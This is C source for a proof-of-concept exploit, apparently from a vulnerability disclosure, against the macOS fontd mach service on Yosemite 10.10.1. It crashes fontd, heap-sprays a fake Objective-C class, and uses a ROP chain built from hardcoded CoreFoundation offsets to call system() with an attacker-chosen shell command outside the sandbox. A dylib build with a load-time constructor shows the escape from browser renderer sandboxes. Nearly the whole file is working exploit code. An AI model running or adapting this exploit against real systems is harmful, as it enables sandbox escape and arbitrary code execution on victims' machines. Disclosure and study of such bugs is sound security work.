// ianbeer
// build (standalone): clang -o fontd_client fontd_client.c -framework CoreFoundation
// build (dylib): clang -dynamiclib -o fontd_client.dylib fontd_client.c -framework CoreFoundation -DIS_DYLIB

// The bug is pretty simple - the com.apple.FontObjectsServer msgh_id 0x2c calls DoHandleXTURLActionMessage which
// treats the first qword the the mach message payload as an objective-c object pointer. This makes no sense and
// is pretty trivial to turn into reliable arbitrary code execution.
//
// com.apple.FontObjectsServer is implemented in libATSServer.dylib which is loaded in the fontd process.
// fontd isn't sandboxed and it's reachable from most sandboxes including safari and chrome renderers.
//
// This PoC will run the shell command you give it below as a regular, unsandboxed user. Build it as a dylib
// to easily load it inside a sandboxed process to demonstrate the impact.
//
// PoC tested on Yosemite 10.10.1 - a bunch of offsets are hardcoded for that version, you will have to fix the ROP
// for other versions.

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <mach-o/dyld_images.h>
#include <unistd.h>
#include <libproc.h>

// set to compile this as a dylib
//#define IS_DYLIB 1

// shell command to run outside the sandbox
char* payload = "touch /tmp/hello_fontd";

void* find_library_load_address(const char* library_name){
  kern_return_t err;

  // get the list of all loaded modules from dyld
  // the task_info mach API will get the address of the dyld all_image_info struct for the given task
  // from which we can get the names and load addresses of all modules
  task_dyld_info_data_t task_dyld_info;
  mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
  err = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);

  const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
  const struct dyld_image_info* image_infos = all_image_infos->infoArray;
  
  for(size_t i = 0; i < all_image_infos->infoArrayCount; i++){
    const char* image_name = image_infos[i].imageFilePath;
    mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
    if (strstr(image_name, library_name)){
      return (void*)image_load_address;
    }
  }
  return NULL;
}

pid_t find_process(char* executable){
  int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t length = 0;
  int err;

  err = sysctl(name, 3, NULL, &length, NULL, 0);
  if(err){
    perror(NULL);
    exit(0);
  }

  struct kinfo_proc* proc_list = malloc(length+0x10000);
  err = sysctl(name, 3, proc_list, &length, NULL, 0);

  if(err){
    perror(NULL);
    exit(0);
  }

  int n_procs = length / sizeof(struct kinfo_proc);
  pid_t pid = 0;

  for(int i = 0; i < n_procs; i++){
    pid = proc_list[i].kp_proc.p_pid;

    char path[PROC_PIDPATHINFO_MAXSIZE];
    err = proc_pidpath(pid, path, sizeof(path));
    if(err <= 0){
      continue;
    }

    char* match = strstr(path, executable);
    if(match == NULL){
      continue;
    }

    if((match + strlen(executable)) == (path + strlen(path))){
      free(proc_list);
      return pid;
    }
  }

  free(proc_list);
  return 0; 
}

struct spray_msg {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t ool_desc;
};

struct heap_spray {
  void* fake_objc_class_ptr; // -------+
  uint64_t zero;             //        |
  struct fake_objc_class_t { //        |
    char pad[0x10]; // <---------------+
    void* cache_buckets_ptr; //--------+
    uint64_t cache_bucket_mask;  //    |
  } fake_objc_class;             //    |
  struct fake_cache_bucket_t {   //    |
    uint64_t cached_sel;      // <-----+  //point to the right selector
    void* cached_function; // will be RIP :)
  } fake_cache_bucket;
  char command[256];
};

void send_spray_msg(mach_port_t service_port) {
  void* heap_spray_target_addr = (void*)0x120202000;
  struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
  memset(hs, 'C', 0x1000);
  hs->fake_objc_class_ptr = &hs->fake_objc_class;
  hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
  hs->fake_objc_class.cache_bucket_mask = 0;

  hs->zero = 0;

  // nasty hack to find the correct selector address :)
  uint8_t* ptr = dlsym(RTLD_DEFAULT, "CFRetain");
  printf("_CFRetain: %p\n", ptr);

  uint64_t* selptr = (uint64_t*)(ptr + 0x98 + (*(int32_t*)(ptr+0x94))); //offset of rip-relative offset of selector 
  uint64_t sel = *selptr;
  hs->fake_cache_bucket.cached_sel = sel;

  uint8_t* corefoundation_base = find_library_load_address("CoreFoundation");

/*
  At the time we get RIP RSP is XXXXXX7d28 and the controllable message data on the stack starts at XXXXXX9700
  which means an add rsp, N of at least 19d8 and up to 2098 will let us ROP on the actual stack, no pivot needed :)

  CoreFoundation+11b1d8 
    add rsp, 0x1f58
    pop rbx
    pop rbp
    ret
*/
  hs->fake_cache_bucket.cached_function = corefoundation_base + 0x11b1d8;
  
  strcpy(hs->command, payload);

  size_t heap_spray_size = 1024*1024*1024;
  size_t heap_spray_pages = heap_spray_size / 4096;

  uint8_t* buf = malloc(heap_spray_size);
  for (size_t i = 0; i < heap_spray_pages; i++) {
    memcpy(buf + (i*4096), hs, 4096);
  }
  
  kern_return_t err;
  struct spray_msg m = {0};
  m.hdr.msgh_size = sizeof(struct spray_msg);
  m.hdr.msgh_local_port = MACH_PORT_NULL;
  m.hdr.msgh_remote_port = service_port;
  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
  m.hdr.msgh_id = 9999; // doesn't matter what this is
  
  m.body.msgh_descriptor_count = 1;

  m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
  m.ool_desc.address = buf;
  m.ool_desc.size = heap_spray_size;
  m.ool_desc.deallocate = 0;
  m.ool_desc.copy = MACH_MSG_VIRTUAL_COPY;

  err = mach_msg(&m.hdr,
                 MACH_SEND_MSG,
                 m.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf(" [-] mach_msg failed with error code:%x\n", err);
    exit(EXIT_FAILURE);
  }
  printf(" [+] looks like that sent?\n");
}

struct fontd_msg {
  mach_msg_header_t hdr; // +0x00
  uint64_t object_ptr;   // +0x18
  uint8_t pad[0x590];
  uint64_t pop_rdi_ret;
  uint64_t command;
  uint64_t system;
  uint64_t exit;
  uint8_t after[0xf0];
  uint32_t client_pid;   // +0x6c0
  uint32_t server_pid;   // +0x6c4
  uint8_t is_le;         // +0x6c8
};

void send_fontd_msg(mach_port_t service_port, uint64_t object_addr) {
  kern_return_t err;
  struct fontd_msg m = {0};
  memset(&m, 'C', sizeof(struct fontd_msg));
  
  uint8_t* corefoundation_base = find_library_load_address("CoreFoundation");
  
  m.pop_rdi_ret = corefoundation_base + 0xd779d;
  m.command = 0x120202000 + offsetof(struct heap_spray, command);
  m.system = dlsym(RTLD_DEFAULT, "system");
  m.exit = dlsym(RTLD_DEFAULT, "exit");

  m.hdr.msgh_size = sizeof(struct fontd_msg);
  m.hdr.msgh_local_port = MACH_PORT_NULL;
  m.hdr.msgh_remote_port = service_port;
  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  m.hdr.msgh_id = 44;
  
  m.client_pid = (uint32_t) getpid();
  m.server_pid = find_process("fontd");
  m.is_le = 1;
  m.object_ptr = object_addr;

  err = mach_msg(&m.hdr,
                 MACH_SEND_MSG,
                 m.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf(" [-] mach_msg failed with error code:%x\n", err);
    exit(EXIT_FAILURE);
  }
  printf(" [+] looks like that sent?\n");
}

mach_port_t mach_connect(char* service_name){
  kern_return_t err;
  
  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] couldn't get bootstrap port\n");
    exit(EXIT_FAILURE);
  }
  printf(" [+] got bootstrap port\n");

  mach_port_t service_port;
  err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] unable to lookup service %s\n", service_name);
    exit(EXIT_FAILURE);
  }
  printf(" [+] got %s mach port\n", service_name);
  return service_port;
}

#ifdef IS_DYLIB
__attribute__((constructor))
#endif
void boom() {
  // crash fontd so we have a clean slate to work with:
  mach_port_t service_port = mach_connect("com.apple.FontObjectsServer");
  send_fontd_msg(service_port, 0x4141414141414140);
  
  // wait a bit
  printf("crashed, waiting...\n");
  sleep(5); 
  
  // connect to the new fontd
  service_port = mach_connect("com.apple.FontObjectsServer");
  
  // send the heap-spray message
  send_spray_msg(service_port);
  
  // we need fontd to actually have restarted when we send the trigger message since the
  // server pid has to be correct
  printf("waiting to make sure fontd has actually started...\n");
  sleep(10);
  
  // trigger the bug again but this time point to the sprayed object  
  send_fontd_msg(service_port, 0x120200000);
}

#ifndef IS_DYLIB
int main(int argc, char** argv){
  boom();
  return EXIT_SUCCESS;
}
#endif
